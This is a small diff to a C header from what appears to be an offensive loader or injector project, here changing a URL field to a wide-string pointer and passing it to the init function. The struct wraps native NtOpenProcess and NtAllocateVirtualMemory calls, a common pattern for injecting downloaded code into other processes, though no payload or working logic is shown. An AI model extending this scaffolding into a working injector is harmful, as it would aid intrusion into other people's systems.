@@ -11,7 +11,7 @@
 
 typedef struct {
     // HTTP Variables ( Not the best way of doing this but whatever.. Will change in future. )
-    WCHAR                       url;
+    wchar_t*                       url;
     // Start Of SithAPI
     NtOpenProcess               SithOpenProcess;
     NtAllocateVirtualMemory     SithVirtualAlloc;
@@ -24,7 +24,7 @@ typedef struct {
 } SITH_INSTANCE, *PSITH_INSTANCE;
 
 
-BOOL PleasureOfYouToJoinUs(); // Init Function
+BOOL PleasureOfYouToJoinUs(wchar_t *url); // Init Function
 
 BOOL WelcomeToTheDarkSide();
 
